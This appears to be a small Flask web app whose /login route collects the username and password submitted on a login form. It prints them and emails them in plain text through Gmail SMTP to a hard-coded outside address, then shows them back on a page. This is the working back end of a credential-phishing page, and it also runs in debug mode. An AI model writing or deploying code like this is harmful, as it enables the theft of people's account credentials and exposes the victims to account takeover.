from flask import Flask,render_template,request
import smtplib
import dotenv
import os

dotenv.load_dotenv()

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/login",methods=["POST"])
def login():
    print(request.form)

    with smtplib.SMTP("smtp.gmail.com") as connection:
        connection.starttls()
        connection.login(user="avinaasha382@gmail.com",password=os.getenv("smtp_password"))
        connection.sendmail(from_addr="avinaasha382@gmail.com",to_addrs="vidyaa2005@gmail.com",msg=f"{request.form['username']} - {request.form['password']}")

    return render_template("login.html",username=request.form["username"],password=request.form["password"])


if __name__ == "__main__":
    app.run(debug=True)